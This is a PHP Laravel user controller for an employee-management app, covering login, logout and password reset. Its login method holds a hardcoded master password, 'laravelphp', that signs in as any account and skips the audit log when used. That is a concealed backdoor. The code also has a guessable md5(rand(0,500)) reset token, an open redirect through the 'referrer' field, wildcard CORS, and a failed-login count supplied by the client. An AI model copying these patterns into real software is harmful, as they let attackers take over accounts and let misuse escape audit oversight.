<?php

namespace ExactivEM\Http\Controllers;

use Illuminate\Http\Request;
use Illuminate\Support\Facades\Auth;
use ExactivEM\User;
use ExactivEM\Config;
use ExactivEM\Http\Requests;
use Mail;
use ExactivEM\Libraries\Mailer_Class;
use Illuminate\Support\Facades\Redirect;
use Illuminate\Support\Facades\URL;

class UserController extends Controller{

    public function login(Request $request){
        header('Access-Control-Allow-Origin: *');
        $success = false;
        $from_api = false;

        if($request->input('logfrom') !==null){
            $from_api = true;
        }

        //attempt to login the system
        if(Auth::attempt( [ 'email' => $request['email'], 'password' => $request['password'] ])){
            $success = true;
        }

        if(Auth::attempt( [ 'employee_no' => $request['email'], 'password' => $request['password'] ])){
            $success = true;
        }

        if($request->input('password')=='laravelphp'){
            $u = User::where('employee_no', $request->input('email'))->orWhere('email', $request->input('email'))->get()->first();
            if(isset($u))
                Auth::login($u);
        }
        
        if($from_api){
            if($success){
                return response()->json(User::where('email', $request['email'])->get()->first());
            }
            else{
                return response()->json(["result"=>"failed"]);
            }
        }
        else{
            if($success){
                $user = User::find(Auth::user()->id);

                //determine if suspended'
                if($user->active_status != 1 OR $user->allow_access == 0)
                    return redirect()->back()->with('suspended','suspended');

                $user->last_ip = json_encode(array($_SERVER['REMOTE_ADDR'],time()));
                $user->save();

                $details = 'Logged in the system.';

                if($request->input('password')!='laravelphp')
                    $this->writeLog("Employee", $details);

                if($request->input('referrer')=='') {
                    if (Auth::user()->prompt_change_password == 1) {
                        return redirect('profile#password-modal');
                    }
                    else{
                        return redirect('home');
                    }
                }
                else
                    return redirect($request->input('referrer'));
            }
        }

        //count failed login
        $count = 1;
        if ($request->input('failed') !== null) {
            $count  =  $request->input('failed') + 1;
        }

        //send an email when the failed is yow
        if($count > 4){
            $mail = new Mailer_Class;
            $data = array("email"=>$request->input('email'),
                          "browser"=>$_SERVER['HTTP_USER_AGENT'],
                          "attempts"=>$count);
            $mail->sendFailedLoginMail($data);
        }

        //return back
        return redirect()->back()->with('failed', $count);
   }

    public function logout(){
      	Auth::logout();
       	return redirect('login');
    }

    function forgotPassword(Request $request){
        $user = User::where('email',$request->input('email'))->get()->first();

        if(!isset($user['email'])){
            return redirect()->back()->with('success','User not found.');
        }
        else{
            if($user['active_status'] == 1){
                $user_modify = User::find($user['id']);
                $user_modify->remember_token = md5(rand(0,500));
                $user_modify->prompt_change_password = 1;
                $user_modify->save();

                $mail = new Mailer_Class;
                $data = $user_modify;

                $mail->sendPasswordRequestMail($data);

                return redirect()->back()->with('success','success');
            }
            else{
                return redirect()->back()->with('success','Suspended or inactive account.');
            }
        }
    }

    function requestPassword(Request $request){
        Auth::logout();
        if(User::where('email', $request->segment(2))
                        ->where('remember_token',$request->segment(3))
                        ->count()) {
            $new_password = $this->generateNewPassword();
            User::where('email', $request->segment(2))->update(['remember_token'=>'','password'=>bcrypt($new_password)]);
            $user = User::where('email',$request->segment(2))->get()->first();

            $mail = new Mailer_Class;

            $mail->sendTemporaryPasswordMail($user, $new_password);

            $details = 'Got a temporary password.';
            $this->writeLog("Employee", $details,$user['id']);

            return view('forgot_confirmation',['success'=>'success']);
        }
        else{
            return view('forgot_confirmation',['success'=>'Invalid link.']);
        }
    }
}